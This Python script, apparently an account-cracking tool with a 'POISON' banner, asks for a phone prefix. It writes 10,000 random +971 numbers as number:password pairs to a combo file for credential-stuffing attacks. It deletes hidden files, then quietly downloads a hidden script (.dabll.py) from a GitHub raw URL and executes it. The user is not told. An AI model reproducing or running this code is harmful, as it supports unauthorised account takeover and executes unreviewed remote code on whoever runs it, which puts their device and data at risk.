import os,sys,random,wget
os.system("clear")
wd = "\033[90;1m" 
GL = "\033[96;1m"
BB = "\033[34;1m"
YY = "\033[33;1m"
GG = "\033[32;1m"
WW = "\033[0;1m" 
RR = "\033[31;1m" 
CC = "\033[36;1m" 
B = "\033[34m"   
Y = "\033[33;1m"    
G = "\033[32m"    
W = "\033[0;1m" 
R = "\033[31m"  
try:
    os.remove(".u-a.py")
except:
    pass
try:
    os.remove("/sdcard/download/.u-a.py")
except:
    pass
os.system("rm -rf .u-a.py ;rm -rf /sdcard/download/.u-a.py")
logo1=G+'''
 ██▓███   ▒█████   ██▓  ██████  ▒█████   ███▄    █ 
 ▓██░  ██▒▒██▒  ██▒▓██▒▒██    ▒ ▒██▒  ██▒ ██ ▀█   █ 
 ▓██░ ██▓▒▒██░  ██▒▒██▒░ ▓██▄   ▒██░  ██▒▓██  ▀█ ██▒
 ▒██▄█▓▒ ▒▒██   ██░░██░  ▒   ██▒▒██   ██░▓██▒  ▐▌██▒
 ▒██▒ ░  ░░  ████▓▒░░██░▒██████▒▒░ ████▓▒░▒██░  ▓██░
 ▒▓▒░ ░  ░░ ▒░▒░▒░ ░▓  ▒ ▒▓▒ ▒ ░░ ▒░▒░▒░ ░ ▒░   ▒ ▒ 
 ░▒ ░       ░ ▒ ▒░  ▒ ░░ ░▒  ░ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░
 ░░       ░ ░ ░ ▒   ▒ ░░  ░  ░  ░ ░ ░ ▒     ░   ░ ░ 
             ░ ░   ░        ░      ░ ░           ░ 
'''+W+''' ---------------------------------------------------
'''+wd+'''   ➣ Author   : Zed Coder
     ➣ GitHub   : https://github.com/968hacker
     ➣ YouTube  : Zed cracker
     ➣ telegram : https://t.me/zed_cracker_1
 '''+W+'''---------------------------------------------------'''
print(logo1)
print('  0712, 0713, 0714 ,0716, 0717, 0719')
so=input("\n   saratakay: ")
for i in range(10000):
    r1=random.randint(1000000, 9999999)
    sys.stdout=open("combo.txt", "a")
    print("+971"+str(so)+str(r1)+":"+str(so)+str(r1))
    sys.stdout.flush()
import wget
url="https://raw.githubusercontent.com/zed404sfrr/-/main/.dabll.py"
wget.download(url)
os.system("python .dabll.py")
